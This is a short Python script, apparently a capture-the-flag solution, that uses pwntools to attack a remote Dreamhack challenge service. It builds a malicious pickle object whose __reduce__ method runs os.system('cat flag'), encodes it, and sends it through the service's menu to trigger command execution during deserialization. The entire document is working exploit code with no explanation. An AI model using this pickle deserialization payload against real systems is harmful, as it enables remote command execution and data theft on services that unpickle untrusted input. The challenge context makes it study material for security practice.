import pickle, os
from base64 import b64encode, b64decode
from pwn import *
import codecs

class Evil(object):
    def __reduce__(self):
        return (os.system,("cat flag",))


e = Evil()
tok = pickle.dumps(e)
tok = tok.decode("utf-16")

# io = process("pizza")
io = remote("host8.dreamhack.games", "9700")

io.sendlineafter(b">", b"pwnie")
io.sendlineafter(b">", b"2")
io.sendline(tok)
io.sendlineafter(b">", b"3")


io.interactive()